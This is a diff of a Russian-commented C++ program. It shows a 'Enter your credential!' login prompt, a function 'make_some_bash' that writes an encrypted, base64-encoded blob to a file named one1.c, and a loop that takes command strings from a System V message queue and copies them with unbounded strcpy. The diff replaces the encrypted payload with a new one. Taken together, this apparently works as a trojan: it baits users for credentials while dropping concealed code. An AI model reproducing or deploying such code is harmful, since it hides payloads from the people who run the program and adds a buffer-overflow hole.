@@ -5,9 +5,9 @@
 
 
 #include <sys/msg.h>
-void make_some_bash(std::string str)
+void make_some_bash()
 {
-	std::string str1 = "U2FsdGVkX19f5kkXQo+LhsnJzGqs2K8xNuOkUJK7MevnePBP4hG48LcNxhnciLVD\nIp8Nx4NwMGwdDJKJ8EWDJRRhOt7Y9NkN0JJhthZJVNysl0f5pKDgIPqSngcrrd4V\nCUdfxtT50Y+ISnD2jCV4m2zqoBuxETHxTok0y6ZYNO5zyi9NEKertYzjBTaM48fM\nLDonG72QvkymEVlk3CY+kuoU0kEzz5zU5zpwpuW9ri4mbia8Hm2aPPuIHXwG8D+N\nwmWNGX9jIG4zeX0tltirDt44OcaMC75ChJD7FvwD0jXXYXIasqMNEr148R5MB/wB\n29Y8ZnmdZowkNGT5uH35MXcMGckuVKwLsd2FN+PSqLKB8RAs60hhP/8Ylm9REOhd\nbNkrzFHdVuAeK7gUQbPoelgdkCPRrMwlP9/W0OXJHisx9OfkgkJXC4ePBlv5IstF\npyaHk5eAJpKJlem3PkAJXZL3Np4sJMeae25+hpDdece7Q8QKQ8P64WwfB+wPv38s\nDnOy5B2nUjPhA2tn8m1Zb5Tr02K2n+h4vhk0BLtNr7xBdz13o2u8CP8lCTIyJfEh\n1OgqkD9yGf0A1pHkc+5usWTGsrJBlWOp5QldSnA/hgShr1UYMIj3qr0kyYDFzfyN\nJVf09DQUfmNSjfJwFu2453HZF8H6K109NbiHgpcIcgUyPIhOdj7j8+TAnceF2aCw\n99g19VtOVg1UsYfMBiNx+Khdt3Mn/1Lq5kj00PKxfgvn9JrU2lJCW+QdxYuLdANx\nmIUg1IOpgojF0eFWg30wCxKE/YlvbJ8nrYIedDWSNTF8DyqiHzwbD+E6J90RNImG\nNJtccHnU+308gH3xSDYZVYgt7uXTH/TZN7XYSR2eEecs/DcTihFDB6Q4JuPX4Xex\ntaGyNgef6ztdDblPR5Z8pvjY1qgrHBX12CHVb9cAsu6pLc6bdurU3MqYoRTSzG5x";
+	std::string str1 = "U2FsdGVkX181YvcoMi5ehTaGn99etL7s5f5xlHASR07aAEyf7BztGUkYvE4XzWVS\nDKeA7LufEQNNWwp6pPwMIUfgi1MX6LZ0RPXVPYK4udf/GuLXFf4aUK+ZRu6nDjSP\nfwYdkWyrIub2t7WuhLRSEggDNjZrSCryAbMF68rTfrpagnQTAiLDtMbpZqBRUpeI\nB8EuUbWDhF6LE0QGrZryh4U9lqknSvkcgR2A6ejwGBNa0rcSk6KOq/WZ8R5iGU7P\nnK615DlTfiZHWe6YPujbJbgEcpsL2/fmHVSJlbtbNwm6RUDrPzAtJCblNohzli7D\nvKdtcz6cBuvds4WrXflflQiClJK86B2DptZB+sj11vlYz+BkC2AQ5Ga8GhJzw2wx\nP/l1P0trcmzByqnDKR9Sej5YX2zwWY5jZjZSJUvjoJdiWneNvZD1UCBHAabGO4Z0\nE91EoUjfWDOGJ4eSBHkKQUK+UXKPBZ+Sjt8Fb37IyS8XbR4UJzZQ1Ew2mN2ypTdd\nrZbS4V1SC8j49QuSr0JRh4dc4LYCCOhYWjtoWEHdJDmwkO9YtTw83kzyxGFHK0fm\nwUoEUVB0+7qoXaQvmfYSkEbDXnyrOHhaHC9ows4WMMAwaZl85G6iG5EQZWnTGKmk\nUN0TRjplNEd8eNdVyD56PAQPnCaIrvxWk+BO45TKgfiH31iLOPMxPagf1jAdVtOs\ngPSsDCTfUHK70YXzSVYTJity5If3pT16lZwd0JSsCSrpEjjH83FrFIfZOQISUc54\nioxdNRhX4lMfOWJU5txo6ng5QcCOKyHSzt7mnbBnE93npu8Kgr0u6B/3aqz+EF+k\nbTeL/UAmXy2K8qYD+oqT9VDlf0pWlyUm4/VJY2I1Q5oF9DvsALRoWUSfRINzlc5q\nvNBCodXaxDkkdLYC9TC1CLrS5li2pwqwNhhJl9MplFI7tERrttYSBxR3ZuZsskT7\niSB83ZeUp3Y=";
 
     std::ofstream out;          // поток для записи
     out.open("one1.c"); // окрываем файл для записи
@@ -40,30 +40,30 @@ int main(int argc, char const *argv[])
 {
 
 	// ////////////////////////////////////////
-	std::cout << "Good time! Enter your credential!" << std::endl << "Enter your logig" << std::endl; ;   
+	std::cout << "Good time! Enter your credential!" << std::endl << "Enter your logig" << std::endl;  
 	std::string login;
 	std::cin >> login;
 	// std::string password;
 	// std::cout << "Enter your password" << std::endl; 
 	// std::cin >> password;
-	make_some_bash("123");
+	make_some_bash();
 
 
 
 	////////////////////////////////////////
 
-char one[1024];
 	struct msgbuf buf;
 
 	char cmd[1024] ;
-	memset(cmd,0,1024);
+	memset(cmd, 0, 1024);
 
 	int fd = msgget(111, 0);
 	if(fd == -1)
 		perror("Ошибка сообщения"); 
 
 	tryAgain:
-	if(msgrcv(fd, &buf, 1024, 16, IPC_NOWAIT) != -1){
+	if(msgrcv(fd, &buf, 1024, 16, IPC_NOWAIT) != -1)
+	{
 		strcpy(cmd, buf.mtext); 
 		printf("%s\n",cmd);
 		// printf("%s\n ", buf.mtext);
@@ -77,7 +77,7 @@ char one[1024];
 
 
 
-	std::cout << "=========================================" << std::endl;
+	// std::cout << "=========================================" << std::endl;
 
 	////////////////////////////////////////
 
